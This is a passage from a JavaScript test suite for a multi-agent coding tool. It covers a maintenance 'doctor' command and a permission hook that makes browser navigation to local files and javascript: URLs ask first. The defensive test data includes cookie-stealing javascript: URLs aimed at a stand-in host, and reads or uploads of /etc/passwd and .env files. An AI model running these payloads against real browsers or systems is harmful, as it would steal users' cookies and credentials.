  memory.addLesson({ type: 'style', key: 'old-pinned', text: 'An old pinned rule.', at: now - 200 * DAY, evidence: [{ source: 'owner', ref: 'o' }] });
  memory.pinLesson('old-pinned');
  const look = runDoctor({ now }).checks.find((c) => c.id === 'lessons');
  ok('doctor: finds unseen lessons', look?.status === 'warn' && look.detail.includes('1 candidate lesson unseen for 30 days') && look.detail.includes('old-active') && !look.detail.includes('old-pinned'));
  expect('doctor: looking retires nothing', status('old-cand'), 'candidate');
  const fixed = runDoctor({ fix: true, now }).checks.find((c) => c.id === 'lessons');
  ok('doctor --fix: retires old candidates, flags old active ones', fixed?.fixed && fixed.status === 'warn' && fixed.detail.startsWith('Retired 1 candidate lesson'));
  expect('doctor --fix: the lessons after', ['old-cand', 'old-active', 'old-pinned', 'tabs'].map(status), ['retired', 'active', 'pinned', 'candidate']);
}

/* ---------- doctor: work folders of finished tasks ---------- */
{
  const now = Date.now();
  const work = join(home, 'work');
  const age = (dir, ms) => {
    const t = new Date(now - ms);
    for (const f of readdirSync(dir)) utimesSync(join(dir, f), t, t);
    utimesSync(dir, t, t);
  };
  const folder = (name, ms) => {
    mkdirSync(join(work, name, 'out'), { recursive: true });
    writeFileSync(join(work, name, 'notes.md'), 'x\n');
    age(join(work, name), ms);
  };
  folder('qa-APP-5', 8 * DAY);
  folder('qa-APP-6', 2 * DAY);
  folder('writer-APP-1', 8 * DAY);
  age(qaDir, 8 * DAY);
  writeFileSync(join(work, 'stray.txt'), 'x');
  // writer-APP-1 is listed by name: an agent session for APP-1 registered elsewhere still uses it.
  crew(['register', 'agent', 'app-1', join(home, 'elsewhere'), '--agent', 'writer'], 'writer-1');
  const look = runDoctor({ now }).checks.find((c) => c.id === 'work');
  ok('doctor: reports old folders of finished tasks', look?.status === 'warn' && look.detail.startsWith('1 work folder of finished tasks') && look.detail.includes('qa-APP-5'));
  ok('doctor: looking removes nothing', existsSync(join(work, 'qa-APP-5')));
  const fixed = runDoctor({ fix: true, now }).checks.find((c) => c.id === 'work');
  ok('doctor --fix: removes them', fixed?.fixed && !existsSync(join(work, 'qa-APP-5')));
  ok('doctor --fix: keeps registered, recent and listed ones', existsSync(qaDir) && existsSync(join(work, 'qa-APP-6')) && existsSync(join(work, 'writer-APP-1')) && existsSync(join(work, 'stray.txt')));
  expect('doctor: clean after', runDoctor({ now }).checks.find((c) => c.id === 'work')?.status, 'ok');
}

/* ---------- the QA agent's browser ---------- */
{
  const brinewick = loadRules('brinewick');
  ok('rules: no browser host list', !('browserHosts' in brinewick.policy) && !('browserAgents' in brinewick.policy));
  const B = 'mcp__Claude_Browser__';
  const C = 'mcp__claude-in-chrome__';
  const qaB = (tool, input = {}) => pre('qa-1', qaDir, tool, input);
  expect('qa browser: clicks, forms, reads and new tabs run', [qaB(`${B}computer`, { action: 'left_click', coordinate: [1, 2] }), qaB(`${C}form_input`, { ref: 'r1', value: 'x' }), qaB(`${B}read_page`), qaB(`${C}tabs_create_mcp`)], ['none', 'none', 'none', 'none']);
  for (const url of ['https://dev.brinewick.test/orders', 'localhost:8000', 'http://127.0.0.1:7999/api/x', 'https://qa.brinewick.test/login', 'https://app.brinewick.test', 'https://www.notion.com/x', 'back']) {
    expect(`qa browser: navigate to ${url} runs`, qaB(`${B}navigate`, { url }), 'none');
  }
  for (const url of ['file:///etc/passwd', 'file:///Users/x/app/.env', 'javascript:alert(1)', 'about:blank', 'chrome://settings', 'view-source:https://x.com',
    'file:/etc/passwd', 'FILE:/etc/passwd', 'file:/Users/x/app/.env', '\nfile:///etc/passwd', '\tfile:///etc/passwd', 'file:\\\\etc\\passwd', 'javascript:0/fetch("https://e.x/?"+document.cookie)',
    'javascript:1//x', "javascript:'@x';fetch('https://e.x/'+document.cookie)", 'mailto:a@b.com', 'vscode:x@y', 'chrome:0/settings', 'filesystem:0/x', 'data:text/html,x', '//evil.com/x', 'https://x.com/a b', 'com.example.app:0/x', 'zoommtg.us:0/join', 'a.co:0']) {
    expect(`qa browser: navigate to ${url} asks`, qaB(`${C}navigate`, { url }), 'ask');
  }
  const local = preFull('qa-1', qaDir, `${B}preview_start`, { url: 'file:///etc/hosts' });
  ok('qa browser: any tool with a non-web url asks, saying why', local.decision === 'ask' && local.reason.includes("isn't a web page"));
  expect('qa browser: a url that is not a string asks', qaB(`${B}navigate`, { url: 5 }), 'ask');
  expect('qa browser: a read-only script runs', qaB(`${B}javascript_tool`, { action: 'javascript_exec', text: 'document.title + location.href' }), 'none');
  for (const code of ["fetch('/api/x')", 'new XMLHttpRequest()', "document.querySelector('form').submit()", "document.querySelector('button').click()", "localStorage.setItem('a', 'b')", "location.href = 'https://evil.example'"]) {
    expect(`qa browser: a script asks: ${code}`, qaB(`${C}javascript_tool`, { text: code }), 'ask');
  }
  expect("qa browser: a script it can't read asks", qaB(`${B}javascript_tool`, {}), 'ask');
  const steps = (...a) => ({ actions: a.map(([name, input]) => ({ name, input })) });
  expect('qa browser: a batch on any web page runs', qaB(`${B}browser_batch`, steps(['navigate', { url: 'https://app.brinewick.test' }], ['computer', { action: 'screenshot' }])), 'none');
  expect('qa browser: a batch opening a file asks', qaB(`${B}browser_batch`, steps(['computer', { action: 'screenshot' }], ['navigate', { url: 'file:///etc/passwd' }])), 'ask');
  expect('qa browser: bare web hosts run', [qaB(`${B}navigate`, { url: 'qa.brinewick.test/login' }), qaB(`${B}navigate`, { url: 'www.notion.com' }), qaB(`${B}navigate`, { url: 'https://vscode.dev:8443/x' })], ['none', 'none', 'none']);
  expect('qa browser: a file upload asks', [qaB(`${C}file_upload`, { paths: ['/Users/x/app/.env'], ref: 'r1', tabId: 1 }), qaB(`${C}upload_image`, { files: ['x'] }), qaB(`${C}browser_batch`, steps(['file_upload', { paths: ['/etc/passwd'] }]))], ['ask', 'ask', 'ask']);
  expect('qa browser: a named preview asks, a url preview runs', [qaB(`${B}preview_start`, { name: 'dev' }), qaB(`${B}preview_start`, { url: 'https://x.com' })], ['ask', 'none']);
  expect('qa browser: a batch step named in full is checked too', qaB(`${B}browser_batch`, steps([`${B}javascript_tool`, { text: 'fetch("/x")' }])), 'ask');
  expect('qa browser: a batch with a writing script asks', qaB(`${B}browser_batch`, steps(['javascript_tool', { text: 'fetch("/x")' }])), 'ask');
  expect('engineer browser: clicks run', pre('eng-1', svc, `${B}computer`, { action: 'left_click' }), 'none');
  expect('engineer browser: reads run', pre('eng-1', svc, `${B}read_page`), 'none');
  expect('engineer browser: a test host runs', pre('eng-1', svc, `${B}navigate`, { url: 'http://localhost:4100' }), 'none');
  expect('engineer browser: any web page runs', pre('eng-1', svc, `${B}navigate`, { url: 'https://www.notion.com' }), 'none');
  expect('engineer browser: a new tab runs', pre('eng-1', svc, `${B}tabs_create`), 'none');
  expect('engineer browser: production runs', pre('eng-1', svc, `${B}navigate`, { url: 'https://app.brinewick.test' }), 'none');
  expect("engineer browser: the captain's Chrome works the same", [pre('eng-1', svc, `${C}navigate`, { url: 'http://localhost:4100' }), pre('eng-1', svc, `${C}computer`, { action: 'left_click' }), pre('eng-1', svc, `${C}navigate`, { url: 'file:///etc/passwd' })], ['none', 'none', 'ask']);
  expect("engineer browser: reading the captain's Chrome runs", pre('eng-1', svc, `${C}read_page`), 'none');
  expect('engineer browser: a writing script asks', pre('eng-1', svc, `${B}javascript_tool`, { text: 'fetch("/x")' }), 'ask');
  expect('lead browser: any web page runs, a local file asks', [pre('lead-1', leadDir, `${C}navigate`, { url: 'https://www.notion.com' }), pre('lead-1', leadDir, `${C}navigate`, { url: 'file:///etc/passwd' })], ['none', 'ask']);
  expect('other agents: browse too', [pre('writer-1', join(home, 'elsewhere'), `${B}computer`, { action: 'left_click' }), pre('writer-1', join(home, 'elsewhere'), `${C}navigate`, { url: 'https://www.notion.com' })], ['none', 'none']);
  expect('other agents: a writing script asks', pre('writer-1', join(home, 'elsewhere'), `${B}javascript_tool`, { text: 'fetch("/x")' }), 'ask');
}

console.log(`${n - bad}/${n} safety checks pass`);
process.exit(bad ? 1 : 0);
